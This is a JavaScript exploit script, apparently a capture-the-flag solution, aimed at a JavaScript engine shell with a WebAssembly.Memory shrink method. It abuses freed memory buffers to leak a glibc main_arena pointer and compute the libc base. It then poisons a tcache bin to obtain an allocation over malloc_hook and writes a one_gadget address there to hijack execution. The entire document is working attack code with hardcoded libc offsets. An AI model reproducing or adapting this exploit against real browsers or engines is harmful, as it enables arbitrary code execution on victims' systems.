RELEASE = true;
RELEASE = false;

let a64 = new ArrayBuffer(8);
let f64 = new Float64Array(a64);
let i64 = new BigInt64Array(a64);

function f2i(v) {
    f64[0] = v;
    return i64[0];
}

function i2f(v) {
    i64[0] = BigInt(v);
    return f64[0];
}

function hex(v) {
    return "0x" + v.toString(16).padStart(16, "0");
}

function detachBuffer(ab) {
    try {
        let w = new Worker("", {type: "string"});
        w.postMessage("", [ab]);
        w.terminate();
        delete w;
    } catch (e) {
        print("Exception when detaching ArrayBuffer");
    }
}

function gc() {
    for (var i = 0; i < 0x1000; i++) {
        // Big memory so big array triggers gc
        new ArrayBuffer(0x10000000);
    }
}

function swap64(v) {
    var x = 0n
    for (var b = 0n; b < 64n; b += 8n) {
        x += ((v >> b) & 0xffn) << (56n - b);
    }
    return x;
}

// ===== LEAK LIBC

gc();

m = new WebAssembly.Memory({initial: 1, maximum: 10});
m.shrink(0x10000 - 0x8000);
// %DebugPrint(m.buffer);
ab2 = m.buffer;
ta2 = new BigInt64Array(ab2);
dv2 = new DataView(ab2);

main_arena = dv2.getBigInt64(0, true);
console.log("main_arena = " + hex(main_arena));
if (!RELEASE) {
    libc_base = main_arena - 0x1ec330n;
} else {
    libc_base = main_arena - 0x1ec370n;
}

let diff = libc_base & 0xffn;
if (diff != 0) {
    libc_base -= diff;
}

console.log("diff libc_base = " + hex(diff));

malloc_hook = libc_base + 0x1ebb70n;
free_hook = libc_base + 0x1eeb28n;
realloc_hook = libc_base + 0x1ebb68n;
console.log("libc_base = " + hex(libc_base));
console.log("malloc_hook = " + hex(malloc_hook));
console.log("free_hook = " + hex(free_hook));
console.log("realloc_hook = " + hex(realloc_hook));

// ===== END LEAK

SZ = 0x64
m = new WebAssembly.Memory({initial: 1, maximum: 10});
m1 = new WebAssembly.Memory({initial: 1, maximum: 10});
m2 = new WebAssembly.Memory({initial: 1, maximum: 10});
m3 = new WebAssembly.Memory({initial: 1, maximum: 10});

// Shrink m and m1 the first time to get a pointer in glibc heap
m.shrink(0x10000 - SZ);
m1.shrink(0x10000 - SZ);

// Because m1.buffer will be on top of the 0x70 tcache bin, we obtain access to poison it.
ab = m1.buffer;
ta = new Uint8Array(ab);
dv = new DataView(ab);

// Put m.buffer and m1.buffer on 0x70 tcache bin
m.shrink(SZ);
m1.shrink(SZ);

// Poison 0x70 tcache bin
PTR = 0x4141414142424242n;
PTR = malloc_hook;

dv.setBigInt64(0, PTR, true);

// Allocate top of 0x70 tcache, which is previously m1.buffer
m2.shrink(0x10000 - SZ);

// Now allocate the poisoned pointer.
m3.shrink(0x10000 - SZ)

one_gadget = libc_base + 0xe6c84n;
one_gadget1 = libc_base + 0xe6c81n;
one_gadget2 = libc_base + 0xe6c7en;

system = libc_base + 0x55410n;
dv = new DataView(m3.buffer);
gc();
dv.setBigInt64(0, one_gadget2, true);